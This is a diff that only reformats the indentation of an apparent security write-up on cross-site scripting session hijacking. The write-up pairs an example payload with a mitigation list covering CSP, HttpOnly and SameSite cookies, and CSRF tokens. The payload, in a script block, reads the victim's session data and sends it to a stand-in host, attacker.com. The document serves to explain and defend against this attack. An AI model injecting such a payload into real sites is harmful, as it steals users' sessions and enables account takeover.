@@ -29,10 +29,10 @@ Attacker injects malicious JavaScript payload into user-controllable input that 
 ```javascript
 <script>
 fetch('/api/user/session', {credentials: 'include'})
-  .then(r => r.json())
-  .then(data => {
-    fetch('https://attacker.com/steal?session=' + btoa(JSON.stringify(data)));
-  });
+ .then(r => r.json())
+ .then(data => {
+ fetch('https://attacker.com/steal?session=' + btoa(JSON.stringify(data)));
+ });
 </script>
 ```
 
@@ -91,20 +91,20 @@ Attacker uses stolen session to impersonate the victim, gaining full access to t
 ## Mitigation
 
 1. **Input Validation & Output Encoding**
-   - Sanitize all user input
-   - Use Content Security Policy (CSP)
-   - Encode output properly
+ - Sanitize all user input
+ - Use Content Security Policy (CSP)
+ - Encode output properly
 
 2. **Session Security**
-   - Use HttpOnly cookies
-   - Implement SameSite cookie attribute
-   - Rotate session tokens regularly
-   - Implement session timeout
+ - Use HttpOnly cookies
+ - Implement SameSite cookie attribute
+ - Rotate session tokens regularly
+ - Implement session timeout
 
 3. **Additional Protections**
-   - Require re-authentication for sensitive actions
-   - Implement CSRF tokens
-   - Use Subresource Integrity (SRI)
+ - Require re-authentication for sensitive actions
+ - Implement CSRF tokens
+ - Use Subresource Integrity (SRI)
 
 ---
 
@@ -113,5 +113,4 @@ Attacker uses stolen session to impersonate the victim, gaining full access to t
 - Many bug bounty reports demonstrate this pattern
 - Common in social media platforms
 - Frequently found in admin panels
-
 
